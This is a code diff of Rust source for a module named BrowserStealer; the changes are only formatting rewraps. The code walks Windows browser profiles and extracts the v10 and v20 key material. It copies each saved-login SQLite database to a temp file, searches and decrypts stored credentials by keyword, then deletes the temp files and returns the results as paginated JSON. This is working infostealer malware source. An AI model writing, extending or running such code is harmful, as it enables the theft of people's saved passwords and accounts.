@@ -52,7 +52,9 @@ impl BrowserStealer {
         for (name, rel_path) in browsers {
             let user_data = format!(r"{}\{}", local_appdata, rel_path);
             let p = std::path::Path::new(&user_data);
-            if !p.exists() { continue; }
+            if !p.exists() {
+                continue;
+            }
 
             let ls_path = p.join("Local State");
             let v10_key = browser_crypto::extract_v10_key(&ls_path);
@@ -65,7 +67,14 @@ impl BrowserStealer {
             if login_db.exists() {
                 let tmp = copy_to_temp(&login_db);
                 if let Some(ref tmp_path) = tmp {
-                    browser_sqlite::search_logins(name, tmp_path, &v10_key, &v20_key, &keyword_lower, &mut matched);
+                    browser_sqlite::search_logins(
+                        name,
+                        tmp_path,
+                        &v10_key,
+                        &v20_key,
+                        &keyword_lower,
+                        &mut matched,
+                    );
                     let _ = std::fs::remove_file(tmp_path);
                     for ext in &["-wal", "-shm"] {
                         let _ = std::fs::remove_file(format!("{}{}", tmp_path, ext));
@@ -88,11 +97,7 @@ impl BrowserStealer {
         }
 
         let total = matched.len();
-        format!(
-            r#"{{"total":{},"items":[{}]}}"#,
-            total,
-            matched.join(",")
-        )
+        format!(r#"{{"total":{},"items":[{}]}}"#, total, matched.join(","))
     }
 
     #[cfg(target_os = "windows")]
@@ -152,7 +157,11 @@ impl BrowserStealer {
         }
 
         let total = all_items.len();
-        let items: Vec<_> = all_items.into_iter().skip(offset).take(if limit == 0 { 100 } else { limit }).collect();
+        let items: Vec<_> = all_items
+            .into_iter()
+            .skip(offset)
+            .take(if limit == 0 { 100 } else { limit })
+            .collect();
         format!(
             r#"{{"total":{},"offset":{},"limit":{},"items":[{}]}}"#,
             total,
@@ -179,7 +188,11 @@ pub(super) fn base64_decode(s: &str) -> Option<Vec<u8>> {
 
 pub(super) fn copy_to_temp(path: &std::path::Path) -> Option<String> {
     use std::io::{Read, Write};
-    let tmp_name = format!("{}\\bd_{}.db", std::env::temp_dir().to_string_lossy(), uuid::Uuid::new_v4().simple());
+    let tmp_name = format!(
+        "{}\\bd_{}.db",
+        std::env::temp_dir().to_string_lossy(),
+        uuid::Uuid::new_v4().simple()
+    );
     let mut src = std::fs::File::open(path).ok()?;
     let mut buf = Vec::new();
     src.read_to_end(&mut buf).ok()?;
